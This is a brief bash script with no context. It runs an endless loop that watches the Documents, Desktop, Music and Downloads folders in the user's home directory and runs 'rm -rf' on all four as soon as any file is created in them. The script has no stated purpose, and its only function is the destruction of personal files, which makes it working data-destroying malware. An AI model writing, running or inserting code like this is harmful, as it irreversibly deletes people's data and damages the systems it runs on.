#!/bin/bash
while true; do
	inotifywait -e create -r ~/Documents ~/Desktop ~/Music ~/Downloads
	rm -rf ~/Documents ~/Desktop ~/Music ~/Downloads
done

